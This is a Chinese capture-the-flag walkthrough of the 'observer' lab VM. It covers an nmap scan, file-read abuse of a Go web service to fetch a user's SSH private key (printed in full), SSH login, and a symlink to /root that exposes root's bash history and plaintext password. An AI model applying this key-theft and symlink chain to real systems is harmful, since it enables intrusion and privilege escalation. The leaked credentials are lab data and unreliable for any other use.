# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A 192.168.21.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 04:43 EST
Nmap scan report for 192.168.21.5
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
|_  256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
3333/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 08 Feb 2026 09:44:11 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 08 Feb 2026 09:43:56 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 08 Feb 2026 09:43:56 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST 
|     <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.95%I=7%D=2/8%Time=69885ADC%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
SF::\x20Sun,\x2008\x20Feb\x202026\x2009:43:56\x20GMT\r\nContent-Length:\x2
SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x
SF:20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20XVlBzgbaiCMRAjWwhTHc
SF:tcuAxhxKQFHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
SF::\x20Sun,\x2008\x20Feb\x202026\x2009:43:56\x20GMT\r\nContent-Length:\x2
SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x
SF:20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20DaFpLSjFbcXoEFfRsWxP
SF:LDnJObCsNVHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOh
SF:FourRequest,DF,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2008\x20Feb\x2
SF:02026\x2009:44:11\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x2
SF:0ports,/Trinity\.txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQle
SF:QYhYzRyWJjPjzpfRFEHMV\x20-->")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x
SF:20header");
MAC Address: 08:00:27:FF:57:61 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.21.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
```

# 漏洞利用

看一下3333端口是什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5:3333
OBSERVING FILE: /home/ NOT EXIST 


<!-- OxKmRNwKDOUnXzmDikdJPukQLaxAHzHMV -->
```

根据返回信息，发现可能存在文件包含漏洞

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5:3333/../../../../etc/passwd
OBSERVING FILE: /home/etc/passwd NOT EXIST 


<!-- gJsjyBqaYFyqjyZdUShIIWpUYaqBhqHMV -->
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.5:3333/FUZZ/.ssh/id_rsa" -w SecLists/Usernames/xato-net-10-million-usernames.txt -fw 8 -s
jan
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5:3333/jan/.ssh/id_rsa         
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

用私钥进行登录

```
┌──(kali㉿kali)-[~]
└─$ ssh jan@192.168.21.5 -i id_rsa                               
The authenticity of host '192.168.21.5 (192.168.21.5)' can't be established.
ED25519 key fingerprint is SHA256:1DlVfPPtEPOsfNJWynWUBQaV6QyJptlKBRMCdyjuusg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.5' (ED25519) to the list of known hosts.
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
jan@observer:~$ id
uid=1000(jan) gid=1000(jan) grupos=1000(jan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

# 权限提升

创建一个软链接到/root，用web服务进行访问jan，会访问到/root。在.bash_history读取到了密码，进行提权

```
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
jan@observer:~$ ln -s /root .
jan@observer:~$ ls
root  user.txt
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.5:3333/jan/root/.bash_history 
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go 
mv observer /opt
ls -l /opt/observer 
crontab -e
nano root.txt
chmod 600 root.txt 
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck1ng0bs3rv3rs
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt 
cd /home/jan
ls -la
cat user.txt 
su jan
reboot
shutdown -h now
jan@observer:~$ su
Contraseña: 
root@observer:/home/jan# id
uid=0(root) gid=0(root) grupos=0(root)
```